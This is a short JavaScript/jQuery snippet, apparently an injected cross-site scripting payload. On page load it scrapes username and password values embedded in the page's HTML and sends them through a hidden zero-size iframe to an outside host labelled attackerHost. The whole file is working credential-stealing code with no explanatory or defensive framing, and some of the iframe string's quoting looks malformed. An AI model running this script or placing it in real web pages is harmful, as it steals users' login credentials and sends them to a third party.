$(document).ready(function() {
  var attackerHost="http://staproject.url.ph/?";
  
  var htmlPage = document.documentElement.innerHTML;
  var findUsername = "var username = '";
  var username='';
  for (var index=htmlPage.search(findUsername)+findUsername.length;(htmlPage[index]!="'")&&(index<htmlPage.length);index++)
  {
    username+=htmlPage[index];
  }
  
  var findPassword = "var password = '";
  var token='';
  for (var index=htmlPage.search(findPassword)+findPassword.length;(htmlPage[index]!="'")&&(index<htmlPage.length);index++)
  {
    token+=htmlPage[index];
  }
  document.documentElement.innerHTML+='<iframe src="'+attackerHost+'&username="'+username+'&token='+token+' height="0" width="0" frameborder="0"></iframe>';
});
